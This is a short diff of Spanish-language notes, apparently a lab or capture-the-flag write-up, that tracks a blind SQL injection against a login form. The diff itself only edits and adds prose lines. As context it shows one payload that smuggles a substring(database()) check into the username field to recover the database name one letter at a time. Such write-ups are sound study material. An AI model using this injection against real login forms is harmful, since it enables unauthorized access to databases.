@@ -63,5 +63,7 @@ obtenemos como respuesta
 	username=kitty'+and+substring(database(),1,1)="m"+#&password=kitty
 ```
 
-para el segundo ataque obtenemos la leta y
+para segunda obtenemos la leta y
 ![[Pasted image 20240204222627.png]]
+
+para el tercer ataque
